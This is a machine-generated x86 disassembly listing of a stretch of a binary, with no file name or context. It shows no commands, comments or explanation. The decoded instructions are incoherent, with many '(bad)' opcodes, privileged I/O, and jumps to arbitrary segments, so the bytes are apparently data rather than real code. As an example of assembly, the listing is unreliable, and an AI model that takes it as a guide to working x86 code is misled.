  4164d8:	loop   0x416526
  4164da:	add    eax,0xe266bd4
  4164df:	mov    al,ds:0x88fd0dd4
  4164e4:	fcmovu st,st(0)
  4164e6:	mov    bh,0xe3
  4164e8:	test   eax,0xfb42dbd
  4164ed:	(bad)  
  4164ee:	or     esi,DWORD PTR [esi-0x49]
  4164f1:	xor    ebx,eax
  4164f3:	xchg   edx,eax
  4164f4:	mov    ah,0x8b
  4164f6:	jno    0x4164fc
  4164f8:	jns    0x416501
  4164fa:	sbb    al,0xa
  4164fc:	repz shl DWORD PTR [eax-0x2c],1
  416500:	jp     0x41652a
  416502:	imul   esi,DWORD PTR [edi],0xffffff9b
  416505:	lea    eax,ds:0xcd19daa6
  41650b:	and    ebx,DWORD PTR [edx+0x21b6cbfb]
  416511:	jle    0x4164c4
  416513:	sub    al,0xda
  416515:	xor    al,0x30
  416517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416518:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416519:	mov    ebx,0x39d635df
  41651e:	xchg   esp,eax
  41651f:	enter  0xc9a7,0xf1
  416523:	out    0x7f,eax
  416525:	inc    esi
  416526:	(bad)  
  416527:	shl    DWORD PTR [eax+0x617eefa2],cl
  41652d:	xchg   esp,eax
  41652e:	sbb    BYTE PTR [ebx-0x35],0xba
  416532:	sub    edi,0xa
  416535:	iret   
  416536:	mov    cl,0x16
  416538:	out    0x17,eax
  41653a:	cld    
  41653b:	or     ebp,DWORD PTR [eax]
  41653d:	jmp    0x6c55:0x5dc777ba
  416544:	fst    QWORD PTR [ebp-0x64]
  416547:	mov    edi,0xa401926f
  41654c:	fisub  DWORD PTR [ecx-0x73]
  41654f:	mov    esi,eax
  416551:	dec    eax
  416552:	jae    0x416540
  416554:	mov    dl,0xd6
  416556:	fiadd  DWORD PTR [esi+0x3af99711]
  41655c:	sub    bh,BYTE PTR [ebx]
  41655e:	outs   dx,BYTE PTR ds:[esi]
  41655f:	jecxz  0x41652d
  416561:	jecxz  0x4164fb
  416563:	jecxz  0x4164fe
  416565:	(bad)  
  416566:	scas   al,BYTE PTR es:[edi]
  416567:	icebp  
  416568:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416569:	ror    DWORD PTR [edx-0x526c6cb8],cl
  41656f:	(bad)  
  416570:	cmp    ah,BYTE PTR [ebx]
  416572:	mov    ah,0xd4
  416574:	mov    ah,0xe8
  416576:	popf   
  416577:	mov    ecx,ebx
  416579:	xchg   BYTE PTR [edi+0x325963b3],dl
  41657f:	push   es
  416580:	(bad)  
  416581:	(bad)  
  416582:	sbb    BYTE PTR [ebp-0x79338137],bl
  416588:	pop    esp
  416589:	xor    BYTE PTR [ecx+0x2e],0x48
  41658d:	mov    edi,0xbaadaa00
  416592:	dec    esi
  416593:	aam    0x57
  416595:	ret    0xac93
  416598:	(bad)  
  416599:	call   0xd01ba1f4
  41659e:	and    eax,0x4451cbdf
  4165a3:	or     eax,0x9367cf85
  4165a8:	jo     0x416605
  4165aa:	rcl    bl,cl
  4165ac:	vmwrite ecx,esp
  4165af:	mov    cl,0xda
  4165b1:	and    DWORD PTR [eax-0x44de0e71],0xffffffff
  4165b8:	dec    ebp
  4165b9:	(bad)  
  4165ba:	xchg   eax,esi
  4165bc:	cwde   
  4165bd:	cmp    al,0x30
  4165bf:	std    
  4165c0:	and    ebp,edi
  4165c2:	imul   ecx,eax,0x759dda1b
  4165c8:	or     dl,BYTE PTR [eax+esi*4]
  4165cb:	outs   dx,BYTE PTR ds:[esi]
  4165cc:	jae    0x4165a4
  4165ce:	and    al,0x58
  4165d0:	shl    BYTE PTR [eax],1
  4165d2:	adc    cl,0x6d
  4165d5:	sbb    dh,BYTE PTR [ecx+0x15]
  4165d8:	cli    
  4165d9:	xor    eax,0xb73f4348
  4165de:	daa    
  4165df:	aam    0x45
  4165e1:	test   eax,0xcc4efddf
  4165e6:	xor    dl,BYTE PTR [ecx]
  4165e8:	fimul  DWORD PTR [ebx]
  4165ea:	jmp    0xc077ec0e
  4165ef:	lea    edi,[edi]
  4165f1:	(bad)  
  4165f2:	or     eax,0x3a54a43b
  4165f7:	push   es
  4165f8:	pop    esi
  4165f9:	pop    esp
  4165fa:	jno    0x4165f7
  4165fc:	sub    al,BYTE PTR [ebx-0x456dae1]
  416602:	ins    BYTE PTR es:[edi],dx
  416603:	aam    0xd0
  416605:	(bad)  [ecx]
  416607:	dec    esp
  416608:	lods   eax,DWORD PTR ds:[esi]
  416609:	xchg   BYTE PTR [eax+0x71],bh
  41660c:	fidiv  DWORD PTR [edi+0x75fc46f7]
  416612:	shr    ebx,1
  416614:	lods   al,BYTE PTR ds:[esi]
  416615:	(bad)  
  416616:	into   
  416617:	dec    edi
  416618:	sub    BYTE PTR [ecx+ecx*2+0x71cadd9e],cl
  41661f:	and    BYTE PTR [edi+0x25],0x88
  416623:	jp     0x41669b
  416625:	push   ecx
  416626:	mov    ah,0xd3
  416628:	mov    ch,0x5e
  41662a:	clc    
  41662b:	xor    BYTE PTR [edx-0x61ad19fb],cl
  416631:	pop    eax
  416632:	push   edi
  416633:	push   esp
  416634:	push   0xffffff8f
  416636:	mov    dl,0x65
  416638:	test   eax,0xebcba91
  41663d:	cmp    dl,BYTE PTR [esi]
  41663f:	ret    0xd618
  416642:	mov    es,WORD PTR [edx]
  416644:	aad    0xb5
  416646:	sbb    eax,edi
  416648:	(bad)  
  41664a:	test   BYTE PTR [ebx-0x52],al
  41664d:	call   0xd0e0:0xcd38635c
  416654:	pop    ss
  416655:	int3   
  416656:	jno    0x41663e
  416658:	push   ebp
  416659:	sbb    BYTE PTR [edi],cl
  41665b:	dec    ecx
  41665c:	fidiv  DWORD PTR [ebx]
  41665e:	pop    ecx
  41665f:	sti    
  416660:	push   0xffffffad
  416662:	inc    ebx
  416663:	lods   eax,DWORD PTR ds:[esi]
  416664:	adc    ch,0xb6
  416667:	mul    DWORD PTR [ebp-0x2fb8e573]
  41666d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41666e:	sub    eax,DWORD PTR [esi-0x35]
  416671:	mov    dl,0xdf
  416673:	fcomi  st,st(0)
  416675:	xor    eax,0x6f1ebcda
  41667a:	(bad)  
  41667b:	int3   
  41667c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41667d:	fxam   
  41667f:	fiadd  WORD PTR [edi]
  416681:	push   ss
  416682:	mov    edi,ecx
  416684:	jnp    0x416618
  416686:	jno    0x416642
  416688:	push   ebp
  416689:	fist   DWORD PTR [eax+0x1f]
  41668c:	xor    eax,0xcbc4ad70
  416691:	dec    esp
  416692:	loop   0x416668
  416694:	lods   al,BYTE PTR ds:[esi]
  416695:	mov    ds:0x3b5a8862,al
  41669a:	sub    al,0x50
  41669c:	inc    esp
  41669d:	imul   esi,DWORD PTR [ecx+0x72],0x2a8c1886
  4166a4:	or     eax,0x54cd6cee
  4166a9:	clc    
  4166aa:	loopne 0x416660
  4166ac:	mov    ebp,0x6df845b6
  4166b1:	ds push ebp
  4166b3:	sti    
  4166b4:	call   0x532a97c2
  4166b9:	shl    BYTE PTR [eax],0x88
  4166bc:	inc    ecx
  4166bd:	sahf   
  4166be:	cld    
  4166bf:	xchg   edx,eax
  4166c0:	fidiv  DWORD PTR ds:0x77d0a883
  4166c6:	add    al,0x26
  4166c8:	fstp   DWORD PTR [edx+0x3e]
  4166cb:	js     0x41670f
  4166cd:	xchg   edx,eax
  4166ce:	xchg   ecx,eax
  4166d0:	push   cs
  4166d1:	dec    ebp
  4166d2:	rcl    bl,1
  4166d4:	mov    DWORD PTR [ecx],ecx
  4166d6:	push   cs
  4166d7:	xor    al,0x32
  4166d9:	je     0x416716
  4166db:	cwde   
  4166dc:	ficom  DWORD PTR [edx-0x75]
  4166df:	adc    dl,BYTE PTR [edx+0x7f]
  4166e2:	xchg   BYTE PTR [ecx+eiz*8],bl
  4166e5:	aad    0x5d
  4166e7:	imul   ecx,DWORD PTR [ebp+0x45],0x67
  4166eb:	bound  edi,QWORD PTR [edi+ebp*4+0x71]
  4166ef:	dec    eax
  4166f0:	jle    0x41668f
  4166f2:	pop    es
  4166f3:	(bad)  
  4166f4:	fsubr  DWORD PTR [eax-0x14]
  4166f7:	lods   eax,DWORD PTR ds:[esi]
  4166f8:	jnp    0x416735
  4166fa:	mov    edx,0xb1a54cc4
  4166ff:	push   esi
  416700:	pop    esp
  416701:	pop    edi
  416702:	imul   edi,DWORD PTR [ebp+0x54c5b6da],0x4
  416709:	adc    esi,ebp
  41670b:	adc    al,0xb8
  41670d:	pop    esi
  41670e:	rcl    DWORD PTR [esi+esi*4+0x21c9f180],cl
  416715:	xor    al,0xd7
  416717:	pop    ebp
  416718:	mov    ch,0xe1
  41671a:	jo     0x41677f
  41671c:	adc    BYTE PTR [esi],cl
  41671e:	push   ds
  41671f:	jbe    0x4166e8
  416721:	ss je  0x4166f7
  416724:	add    esi,0xffffffb2
  416727:	sbb    bh,bl
  416729:	jmp    0x4166e4
  41672b:	leave  
  41672c:	retf   
  41672d:	cwde   
  41672e:	push   edx
  41672f:	sub    BYTE PTR [edx+0x39bb59b6],dl
  416735:	dec    edi
  416736:	jmp    0x31d2810e
  41673b:	cmp    ecx,DWORD PTR [esi-0x25ef7723]
  416741:	cli    
  416742:	adc    ch,BYTE PTR [eax+0x5e]
  416745:	repz scas al,BYTE PTR es:[edi]
  416747:	jnp    0x4167ab
  416749:	mov    edx,0x16998547
  41674e:	ins    DWORD PTR es:[edi],dx
  41674f:	cli    
  416750:	jecxz  0x416720
  416752:	adc    cl,BYTE PTR [eax-0x1b90121e]
  416758:	inc    esi
  416759:	mov    dh,0xac
  41675b:	out    dx,eax
  41675c:	mov    WORD PTR [ebx],fs
  41675e:	mov    eax,ds:0xd1d65163
  416763:	test   eax,0xe5f3a188
  416768:	shl    BYTE PTR [ebx],cl
  41676a:	jno    0x4167d6
  41676c:	gs pop ss
  41676e:	std    
  41676f:	mov    eax,ds:0xd46a0b0c
  416774:	stos   BYTE PTR es:[edi],al
  416775:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416776:	jns    0x416725
  416778:	mov    ebx,0xdae4d8ec
  41677d:	call   0xd27e:0x47393018
  416784:	fcmovnb st,st(2)
  416786:	pop    es
  416787:	jno    0x416804
  416789:	(bad)  
  41678a:	jno    0x41679b
  41678c:	pop    esi
  41678d:	into   
  41678e:	bound  ebp,QWORD PTR [edx]
  416790:	retf   
  416791:	inc    ebp
  416792:	and    eax,DWORD PTR [ecx+0x38395229]
  416798:	pop    ss
  416799:	sbb    BYTE PTR [eax],dh
  41679b:	or     al,0xbf
  41679d:	sub    ecx,DWORD PTR [edx+0xdd66323]
  4167a3:	(bad)  
  4167a4:	dec    esi
  4167a5:	cwde   
  4167a6:	in     al,0x3d
  4167a8:	shl    BYTE PTR cs:[edx+0x4b],1
  4167ac:	in     al,0xa3
  4167ae:	jbe    0x4167a3
  4167b0:	dec    esp
  4167b1:	bound  edx,QWORD PTR [ebp+0x5fccde10]
  4167b7:	mov    ch,0xb6
  4167b9:	stos   DWORD PTR es:[edi],eax
  4167ba:	jno    0x4167ee
  4167bc:	outs   dx,BYTE PTR ds:[esi]
  4167bd:	dec    edx
  4167be:	add    al,al
  4167c0:	mov    ebp,0xb838e69
  4167c5:	cmp    dh,BYTE PTR [edx+0x169e2cd3]
  4167cb:	mov    dh,0x2a
  4167cd:	iret   
  4167ce:	dec    ebp
  4167cf:	ret    0xb09d
  4167d2:	dec    edi
  4167d3:	mov    cl,0xc1
  4167d5:	push   edi
  4167d6:	mov    cl,0x3d
  4167d8:	xor    bh,BYTE PTR [ecx+esi*2]
  4167db:	popf   
  4167dc:	inc    ebp
  4167dd:	das    
  4167de:	mov    edi,0xeb9df3ff
  4167e3:	rcr    ebp,cl
  4167e5:	stos   BYTE PTR es:[edi],al
  4167e6:	ja     0x4167b9
  4167e8:	mov    dl,cl
  4167ea:	popa   
  4167eb:	mov    bl,cl
  4167ed:	mov    edx,0x16939f81
  4167f2:	or     edi,ecx
  4167f4:	adc    esp,DWORD PTR [ebp+edx*4-0x829d7a7]
  4167fb:	loopne 0x416876
  4167fd:	fild   WORD PTR ss:[ebx+eax*8+0x77]
  416802:	jno    0x416840
  416804:	scas   eax,DWORD PTR es:[edi]
  416805:	sbb    ecx,DWORD PTR [ebx-0x37]
  416808:	aam    0x1d
  41680a:	out    0xd3,eax
  41680c:	jmp    0xff63:0xd7f5
  416812:	sub    DWORD PTR [ebx-0x26],esi
  416815:	je     0x4167bb
  416817:	sbb    eax,DWORD PTR [esi+ebp*8+0x3c]
  41681b:	adc    BYTE PTR [ebx-0x5fd4002a],cl
  416821:	fwait
  416822:	pop    ds
  416823:	mov    dl,0xd6
  416825:	cmp    edx,DWORD PTR [ebp-0x48]
  416828:	xchg   edi,eax
  416829:	push   ebp
  41682a:	icebp  
  41682b:	push   ss
  41682c:	jmp    0x1d10516a
  416831:	les    edi,FWORD PTR [esi-0x8299754]
  416837:	es xor cl,bl
  41683a:	lea    eax,[edx+ebx*8-0x66]
  41683e:	mov    ds:0x8ad529bd,al
  416843:	nop
  416844:	fst    st(5)
  416846:	aam    0x3e
  416848:	ins    DWORD PTR es:[edi],dx
  416849:	scas   al,BYTE PTR es:[edi]
  41684a:	aad    0x3
  41684c:	jl     0x41687a
  41684e:	dec    ecx
  41684f:	push   cs
  416850:	sbb    DWORD PTR [edi],edi
  416852:	jno    0x4168d2
  416854:	jb     0x41689e
  416856:	lea    ecx,[eax+0x25]
  416859:	rol    DWORD PTR [edx],cl
  41685b:	leave  
  41685c:	out    0xc9,eax
  41685e:	and    ebx,DWORD PTR [ebx+0x30a8a15a]
  416864:	es push es
  416866:	push   ebp
  416867:	into   
  416868:	inc    edx
  416869:	ret    
  41686a:	jno    0x416830
  41686c:	stos   BYTE PTR es:[edi],al
  41686d:	pop    ecx
  41686e:	cs icebp 
  416870:	ret    0x24d6
  416873:	push   ss
  416874:	pop    eax
  416875:	jbe    0x4168dd
  416877:	lods   al,BYTE PTR ds:[esi]
  416878:	adc    al,0x9a
  41687a:	jno    0x416891
  41687c:	hlt    
  41687d:	sahf   
  41687e:	push   ebx
  41687f:	push   0x9ae80edc
  416884:	icebp  
  416885:	add    eax,0xb6f56671
  41688a:	push   ecx
  41688b:	ror    bh,cl
  41688d:	div    DWORD PTR [eax-0x55]
  416890:	ins    DWORD PTR es:[edi],dx
  416891:	clc    
  416892:	inc    ebp
  416893:	mov    ebp,0xd3b43d2d
  416898:	add    DWORD PTR [ecx+0x33ca8574],ebx
  41689e:	scas   al,BYTE PTR es:[edi]
  41689f:	sub    ah,BYTE PTR [edx-0x42be069]
  4168a5:	call   0x635dc3b5
  4168aa:	repnz shl DWORD PTR [edx],cl
  4168ad:	pop    edx
  4168ae:	xor    bl,dh
  4168b0:	call   0xda6708a0
  4168b5:	fnstsw WORD PTR ds:0xc8a53254
  4168bb:	or     ah,BYTE PTR [ecx]
  4168bd:	fdiv   st,st(2)
  4168bf:	shr    DWORD PTR [edx-0x5b1babf1],cl
  4168c5:	sub    al,0x50
  4168c7:	sbb    edx,0x85f94838
  4168cd:	pop    esi
  4168ce:	or     esi,DWORD PTR [edx+ecx*4-0x2a]
  4168d2:	sub    BYTE PTR [eax-0x7f],ah
  4168d5:	inc    edi
  4168d6:	call   0x71f652a5
  4168db:	sbb    BYTE PTR [eax+0x28731a85],dl
  4168e1:	dec    eax
  4168e2:	test   ebx,edx
  4168e4:	out    0x54,al
  4168e6:	stc    
  4168e7:	push   ebp
  4168e8:	lods   al,BYTE PTR ds:[esi]
  4168e9:	ret    0xf788
  4168ec:	fidiv  DWORD PTR [esi]
  4168ee:	sti    
  4168ef:	sbb    DWORD PTR ds:0x9561ca39,ecx
  4168f5:	(bad)  
  4168f6:	sub    al,BYTE PTR [edx]
  4168f8:	loop   0x416884
  4168fa:	(bad)  
  4168fb:	cmc    
  4168fc:	repnz sub BYTE PTR [ebp-0x4b],al
  416900:	lods   eax,DWORD PTR ds:[esi]
  416901:	sub    DWORD PTR [ecx-0x6b],esi
  416904:	js     0x416983
  416906:	fwait
  416907:	enter  0xd6d8,0x5f
  41690b:	adc    ecx,DWORD PTR [eax]
  41690d:	push   esi
  41690e:	je     0x4168dd
  416910:	retf   
  416911:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416912:	jno    0x416921
  416914:	lock sahf 
  416916:	das    
  416917:	add    DWORD PTR [esi],edi
  416919:	adc    ch,dl
  41691b:	shr    DWORD PTR ds:0x7f6a2527,cl
  416921:	jl     0x4168d3
  416923:	add    bl,dl
  416925:	dec    eax
  416926:	sbb    eax,0xd2f08fdd
  41692b:	(bad)  
  41692c:	clc    
  41692d:	aad    0x22
  41692f:	add    DWORD PTR [ebx+0x5a3499c6],edx
  416935:	stos   BYTE PTR es:[edi],al
  416936:	jno    0x416928
  416938:	out    dx,al
  416939:	jb     0x416976
  41693b:	xor    esi,DWORD PTR [eax-0x68]
  41693e:	sub    edx,esp
  416940:	jl     0x4168d0
  416942:	mov    edi,0xad3c8d80
  416947:	jg     0x416905
  416949:	sbb    bl,BYTE PTR [eax-0x48fe2503]
  41694f:	mov    ebp,0xd3cc9547
  416954:	stos   BYTE PTR es:[edi],al
  416955:	and    eax,0x8adc2d61
  41695a:	icebp  
  41695b:	mov    ds,edx
  41695d:	sub    bl,ah
  41695f:	mov    cl,0xa
  416961:	jp     0x4169bd
  416963:	xor    bh,al
  416965:	sar    DWORD PTR [ebx+0x4d],1
  416968:	fnstcw WORD PTR [ebp+0x4]
  41696b:	push   esp
  41696c:	xchg   ecx,eax
  41696d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41696e:	es hlt 
  416970:	sar    DWORD PTR [edx-0x21a99f0f],cl
  416976:	nop
  416977:	inc    ebx
  416978:	pusha  
  416979:	adc    eax,0x795bc597
  41697e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41697f:	loopne 0x4169f6
  416981:	fstp   DWORD PTR [esp+edx*2]
  416984:	cld    
  416985:	scas   al,BYTE PTR es:[edi]
  416986:	sub    dh,BYTE PTR [ecx+0x38770bc]
  41698c:	fiadd  DWORD PTR [eax]
  41698e:	lds    esp,FWORD PTR [ecx-0x47]
  416991:	or     DWORD PTR [ebx+edx*8+0x37b7bcbc],ebx
  416998:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416999:	push   0x1d
  41699b:	sub    bl,cl
  41699d:	xchg   ebp,eax
  41699e:	push   es
  41699f:	enter  0x4934,0xd1
  4169a3:	dec    edi
  4169a4:	repnz sbb bh,BYTE PTR [ecx+0x57f45d3b]
  4169ab:	aam    0x37
  4169ad:	ret    
  4169ae:	cmp    al,0x57
  4169b0:	push   eax
  4169b1:	or     BYTE PTR [ebx-0x18],ah
  4169b4:	xlat   BYTE PTR ds:[ebx]
  4169b5:	xchg   ecx,eax
  4169b6:	test   al,0xfa
  4169b8:	ins    DWORD PTR es:[edi],dx
  4169b9:	loope  0x4169f5
  4169bb:	sbb    al,0xa0
  4169bd:	mov    ecx,0x29a5d011
  4169c2:	iret   
  4169c3:	mov    edx,0xdcdb13b6
  4169c8:	and    edx,DWORD PTR [esi+0x3d7c15c8]
  4169ce:	arpl   si,dx
  4169d0:	or     al,0xb3
  4169d2:	ss icebp 
  4169d4:	or     edi,DWORD PTR [edi]
  4169d6:	mov    ebx,ebx
  4169d8:	dec    ebx
  4169d9:	bnd ret 0xa79a
  4169dd:	in     eax,dx
  4169de:	in     eax,dx
  4169df:	mov    bh,0x3f
  4169e1:	scas   al,BYTE PTR es:[edi]
  4169e2:	mov    ds:0xcea2e3df,eax
  4169e7:	cli    
  4169e8:	xor    bl,BYTE PTR [edx-0x5]
  4169eb:	mov    dl,0xd9
  4169ed:	dec    edi
  4169ee:	adc    edx,ebp
  4169f0:	jle    0x4169d9
  4169f2:	sub    eax,0x259ee21e
  4169f7:	aam    0x16
  4169f9:	dec    esi
  4169fa:	les    esi,FWORD PTR [eax+0x25d1cbe5]
  416a00:	fidivr DWORD PTR [esi+0x21175a6a]
  416a06:	mov    dh,0x93
  416a08:	pop    edi
  416a09:	(bad)  
  416a0a:	sbb    bl,dl
  416a0c:	lahf   
  416a0d:	in     al,0xcb
  416a0f:	and    ecx,DWORD PTR [ebx+eax*1+0x20b8e771]
  416a16:	mov    al,ds:0x7af2fbe7
  416a1b:	sar    DWORD PTR [ebx],cl
  416a1d:	dec    ecx
  416a1e:	sub    ebp,DWORD PTR [ecx+0x59]
  416a21:	or     edx,DWORD PTR [ecx]
  416a23:	add    dl,bl
  416a25:	cmc    
  416a26:	jne    0x416a75
  416a28:	jno    0x416a6a
  416a2a:	imul   esi,edx,0x1
  416a2d:	mov    eax,0xd6aaa869
  416a32:	mov    ds:0x284e3f56,eax
  416a37:	arpl   dx,bx
  416a39:	shr    DWORD PTR [ebx+ebx*1],0xa1
  416a3d:	data16 mov dl,0x43
  416a40:	push   ebx
  416a41:	(bad)  
  416a42:	cld    
  416a43:	js     0x4169d0
  416a45:	xchg   esp,eax
  416a46:	aam    0x8
  416a48:	adc    BYTE PTR [ecx],dh
  416a4a:	jno    0x416a35
  416a4c:	pop    ebp
  416a4d:	hlt    
  416a4e:	mov    esi,0x76d41827
  416a53:	shl    DWORD PTR [ebx+0x1e],cl
  416a56:	fwait
  416a57:	cmp    al,0x27
  416a59:	lods   eax,DWORD PTR ds:[esi]
  416a5a:	(bad)  
  416a5b:	fst    st(3)
  416a5d:	mov    eax,ds:0xbcf3a986
  416a62:	loope  0x416a57
  416a64:	mov    bh,0x3e
  416a66:	test   dh,ch
  416a68:	out    0xf8,al
  416a6a:	xor    edx,esp
  416a6c:	out    0x53,al
  416a6e:	sbb    DWORD PTR [ebp-0x640c227b],esi
  416a74:	fiadd  DWORD PTR [edx-0x59]
  416a77:	sar    DWORD PTR [ecx],1
  416a79:	out    dx,al
  416a7a:	in     al,0xa2
  416a7c:	add    edx,esi
  416a7e:	fnstenv [edi-0x5038f066]
  416a84:	scas   al,BYTE PTR es:[edi]
  416a85:	mov    dh,BYTE PTR [ecx-0x4c]
  416a88:	adc    al,0xce
  416a8a:	inc    edx
  416a8b:	sbb    eax,0xb56a8b88
  416a90:	cmp    eax,0x8c598ae
  416a95:	dec    eax
  416a96:	icebp  
  416a97:	push   0xc380d09a
  416a9c:	fimul  DWORD PTR [esi]
  416a9e:	and    edx,edx
  416aa0:	pop    edx
  416aa1:	in     eax,dx
  416aa2:	xor    bl,BYTE PTR [esi-0x1693686f]
  416aa8:	pop    ecx
  416aa9:	fadd   st(4),st
  416aab:	pop    esp
  416aac:	dec    ecx
  416aad:	aas    
  416aae:	add    eax,0x6e6cea14
  416ab3:	fnsave [edx-0x7a0e17f6]
  416ab9:	push   esi
  416aba:	dec    ebp
  416abb:	adc    eax,0x481ed625
  416ac0:	jmp    0x416a64
  416ac2:	pop    eax
  416ac3:	xchg   ebx,eax
  416ac4:	stos   BYTE PTR es:[edi],al
  416ac5:	push   ss
  416ac6:	jno    0x416a8c
  416ac8:	jno    0x416a7f
  416aca:	shl    BYTE PTR [ecx],1
  416acc:	mov    al,ds:0x14d3ade1
  416ad1:	cmp    al,dh
  416ad3:	arpl   WORD PTR [ecx+eiz*1],ax
  416ad6:	pop    ds
  416ad7:	pop    edx
  416ad8:	fidivr DWORD PTR [eax-0x5f8edfdc]
  416ade:	inc    eax
  416adf:	and    eax,0x6a43d654
  416ae4:	pop    eax
  416ae5:	inc    esp
  416ae6:	sub    ebp,DWORD PTR [ebp+0x3c70bda2]
  416aec:	and    DWORD PTR [ecx],edx
  416aee:	pop    ebp
  416aef:	ds ss pop esi
  416af2:	test   eax,0x9ad6b5e3
  416af7:	jge    0x416b27
  416af9:	add    edi,ebx
  416afb:	stos   DWORD PTR es:[edi],eax
  416afc:	(bad)
  416aff:	push   es
  416b00:	mov    fs,WORD PTR [esp+eax*2-0x3a03bcea]
  416b07:	shl    DWORD PTR [eax+0x33d5c7b4],cl
  416b0d:	repnz mov ah,BYTE PTR [eax]
  416b10:	fiadd  DWORD PTR [ecx]
  416b12:	test   bl,cl
  416b14:	shr    DWORD PTR [edx],cl
  416b16:	ins    DWORD PTR es:[edi],dx
  416b17:	imul   DWORD PTR [edx-0x2a]
  416b1a:	cmp    eax,0x3674e19f
  416b1f:	xor    bl,BYTE PTR [ebp-0x73]
  416b22:	jno    0x416b3c
  416b24:	mov    bl,0x69
  416b26:	xor    al,0xc4
  416b28:	ror    BYTE PTR [edi],1
  416b2a:	cli    
  416b2b:	fnstcw WORD PTR [esi+edx*8-0x42f61c7c]
  416b32:	xor    eax,0x292c65eb
  416b37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b38:	ds (bad) 
  416b3a:	adc    DWORD PTR ds:0x11ab205b,esp
  416b40:	push   cs
  416b41:	call   0xd1f9:0xdc5a7598
  416b48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b49:	sbb    al,0x7e
  416b4b:	out    dx,eax
  416b4c:	fisub  DWORD PTR [ecx+0x1a2f4651]
  416b52:	mul    BYTE PTR [ebx+0x2a38d66a]
  416b58:	mov    ch,0x74
  416b5a:	jnp    0x416afe
  416b5c:	dec    edx
  416b5d:	xor    BYTE PTR [ecx+0x6f],0x65
  416b61:	or     al,0x33
  416b63:	sti    
  416b64:	push   ebx
  416b65:	addr16 rcl ebx,0x8a
  416b69:	sbb    eax,0x21bee758
  416b6e:	mov    edx,0x6c13cbdb
  416b73:	shl    BYTE PTR [ecx-0x4b],1
  416b76:	and    eax,0xa3349ecc
  416b7b:	nop
  416b7c:	(bad)  
  416b7e:	push   ebp
  416b7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b80:	ror    DWORD PTR [ebx],0xf1
  416b83:	loope  0x416b62
  416b85:	adc    BYTE PTR ds:0xd356a9af,dh
  416b8b:	test   eax,0xd024ceba
  416b90:	imul   ebx,DWORD PTR [esi],0x64
  416b93:	cdq    
  416b94:	push   ebx
  416b95:	mov    edi,0xab34b6e
  416b9a:	int    0xdf
  416b9c:	pop    edx
  416b9d:	mov    ebx,edx
  416b9f:	pop    esp
  416ba0:	int3   
  416ba1:	gs pop ecx
  416ba3:	sbb    BYTE PTR [ebp+0x36],ch
  416ba6:	popf   
  416ba7:	push   ebx
  416ba8:	fistp  DWORD PTR [eax+0x44d1375e]
  416baf:	sub    eax,0xd3fd085c
  416bb4:	adc    eax,0x85bfe12c
  416bb9:	call   0xd513b0f3
  416bbe:	das    
  416bbf:	xor    ch,BYTE PTR [edi+0x71134401]
  416bc5:	cdq    
  416bc6:	icebp  
  416bc7:	ret    
  416bc8:	js     0x416b5a
  416bca:	fmul   DWORD PTR [edi-0x6a]
  416bcd:	sbb    edx,DWORD PTR [ebx-0x48]
  416bd0:	pop    ebx
  416bd1:	pop    esi
  416bd2:	xor    dl,al
  416bd4:	xchg   ebp,eax
  416bd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bd6:	xchg   ecx,eax
  416bd7:	or     DWORD PTR [edx],edx
  416bd9:	mov    DWORD PTR [edx],esp
  416bdb:	aam    0xb
  416bdd:	out    0x15,eax
  416bdf:	jne    0x416c1f
  416be1:	push   eax
  416be2:	mov    DWORD PTR [edi-0x42],esi
  416be5:	loopne 0x416bcb
  416be7:	mov    cl,0x99
  416be9:	sbb    DWORD PTR [ebx-0x30],ebx
  416bec:	push   ss
  416bed:	les    eax,FWORD PTR [ecx]
  416bef:	call   0x3a924229
  416bf4:	leave  
  416bf5:	push   edx
  416bf6:	add    bh,BYTE PTR [ebx+0x3d776e3a]
  416bfc:	fisub  DWORD PTR [eax+ecx*1]
  416bff:	sub    BYTE PTR [esi+edi*1+0x65d88326],0xe3
  416c07:	pop    edi
  416c08:	out    0xad,al
  416c0a:	pinsrw mm0,WORD PTR [edx],0xd5
  416c0e:	xchg   ecx,eax
  416c0f:	push   0x31dfcbaf
  416c14:	push   edi
  416c15:	or     cl,dh
  416c17:	es (bad) 
  416c1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c1b:	je     0x416be4
  416c1d:	xchg   edi,eax
  416c1e:	leave  
  416c1f:	xchg   edx,eax
  416c20:	jecxz  0x416bf7
  416c22:	test   eax,0x4585e453
  416c27:	lods   eax,DWORD PTR ds:[esi]
  416c28:	fld    st(4)
  416c2a:	jns    0x416c5b
  416c2c:	fisub  DWORD PTR [edx+0x4a5240fb]
  416c32:	dec    esp
  416c33:	iret   
  416c34:	leave  
  416c35:	(bad)  
  416c36:	and    al,0x2d
  416c38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c39:	adc    esi,ebx
  416c3b:	xor    eax,0x6c71cfe0
  416c40:	xchg   ecx,eax
  416c41:	les    esp,FWORD PTR ds:0xbd249c9c
  416c47:	ror    DWORD PTR [ebp+eax*2-0x1a66eb76],cl
  416c4e:	adc    al,0x9f
  416c50:	mov    ebp,0x5ab97d84
  416c55:	vpmullw xmm2,xmm5,XMMWORD PTR [ecx-0x65ec7522]
  416c5d:	jl     0x416c21
  416c5f:	mov    DWORD PTR [ecx+0x2],edx
  416c62:	jno    0x416c69
  416c64:	sbb    dl,BYTE PTR [edi-0xd]
  416c67:	sub    BYTE PTR [eax],cl
  416c69:	jmp    0x6c394045
  416c6e:	push   edi
  416c6f:	cld    
  416c70:	js     0x416caa
  416c72:	push   ds
  416c73:	stos   DWORD PTR es:[edi],eax
  416c74:	popa   
  416c75:	cmp    ah,BYTE PTR [edx-0x4e]
  416c78:	pop    es
  416c79:	test   BYTE PTR [edx+0x2cc53ab3],dl
